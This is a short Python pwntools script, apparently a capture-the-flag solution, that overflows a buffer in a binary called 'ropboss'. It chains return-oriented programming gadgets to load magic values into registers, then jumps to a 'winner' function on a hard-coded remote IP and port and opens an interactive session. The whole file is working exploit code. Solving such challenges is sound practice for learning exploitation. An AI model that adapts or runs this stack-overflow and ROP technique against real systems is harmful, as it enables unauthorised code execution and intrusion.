from pwn import *

elf=context.binary = ELF("./ropboss")

#p=process("./ropboss")
p=remote("34.213.62.140",6003)

pop_rdi_ret = 0x0000000000401423 
pop_rsi_r15_ret = 0x0000000000401421 
mov_rcx_rsi_pop_rbp_ret = 0x00000000004012d4 
mov_rdx_rdi_pop_rbp_ret = 0x0000000000401267
winner = 0x000000000040126d
ret = 0x000000000040101a

#gdb.attach(p)

payload = b'a'*56 + p64(pop_rdi_ret) + p64(0xbabecafe) + p64(pop_rsi_r15_ret) + p64(0xd00df00d) + p64(0x0) + \
    p64(mov_rcx_rsi_pop_rbp_ret) + p64(0x0) + p64(mov_rdx_rdi_pop_rbp_ret) + \
    p64(0x0) + p64(pop_rdi_ret) + p64(0xdeadbeef) + \
    p64(pop_rsi_r15_ret) + p64(0xcafebabe) + p64(0x0) + p64(ret) + p64(winner)
    

p.recvline()
p.sendline(b'yes')
p.recvline()
p.sendline(payload)
p.interactive()
